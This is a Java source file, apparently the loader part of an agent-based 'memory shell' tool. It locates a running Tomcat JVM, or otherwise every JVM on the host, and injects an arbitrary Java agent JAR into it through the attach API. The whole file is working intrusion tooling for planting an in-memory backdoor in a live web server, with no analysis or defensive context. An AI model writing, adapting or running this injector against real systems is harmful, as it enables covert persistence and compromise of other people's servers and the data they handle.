import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AgentShellMain {
    public static void main(String[] args) throws Exception{
        String path = args[0];
        System.out.println(path);
        File file = new File(path);
        if (file.isFile()){
            String pid = AgentShellMain.getTomcatPid2();
            if(pid == null){
                pid = AgentShellMain.getTomcatPid();
            }
            if (pid != null){
                VirtualMachine vm = VirtualMachine.attach(pid);
                System.out.println(pid);
                vm.loadAgent(path);
                vm.detach();
            }else {
                List<String> allId = AgentShellMain.getAllId();
                for (String id : allId){
                    try {
                        VirtualMachine vm = VirtualMachine.attach(id);
                        System.out.println(id);
                        vm.loadAgent(path);
                        vm.detach();
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }else {
            throw new Exception("[!] " + path + " is not a file");
        }
    }
    public static List<String> getAllId(){
        List<String> l = new ArrayList<>();
        try{
            List<VirtualMachineDescriptor> list = VirtualMachine.list();
            for (VirtualMachineDescriptor v:list){
                if (v.displayName().contains("org.jetbrains.jps.cmdline.Launcher") || v.displayName().contains("AgentShellMain") || v.displayName().contains("RemoteMavenServer") || v.displayName().equals("")){
                    continue;
                }
                l.add(v.id());
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return l;
    }


    public static String getTomcatPid(){
        try {
            Process ps = Runtime.getRuntime().exec("jps");
            InputStream is = ps.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader bis = new BufferedReader(isr);
            String line;
            StringBuilder sb = new StringBuilder();
            String result = null;
            while((line=bis.readLine())!=null){
                sb.append(line+";");
            }
            result = sb.toString();
            Pattern p = Pattern.compile("(\\d+)\\sBootstrap");
            Matcher m = p.matcher(result);
            if(m.find()){
                return  m.group(1);
            }
        }catch (Exception e){

        }
        return null;
    }

    public static String getTomcatPid2(){
        try{
            List<VirtualMachineDescriptor> list = VirtualMachine.list();
            for (VirtualMachineDescriptor v:list){
                if (v.displayName().contains("org.apache.catalina.startup.Bootstrap")){
                    return v.id();
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return null;
    }
}
